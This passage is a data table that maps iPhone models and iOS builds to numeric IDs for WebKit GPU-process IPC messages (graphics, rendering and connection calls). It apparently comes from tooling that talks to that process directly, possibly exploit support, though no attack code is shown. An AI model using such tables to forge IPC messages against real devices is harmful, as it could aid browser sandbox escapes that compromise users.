      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,4_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,5_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },

    "iPhone11,2_4_6_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone11,8_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone12,1_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone12,3_5_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone12,8_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone13,1_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone13,2_3_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone13,4_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,2_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,3_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,4_22G100": {
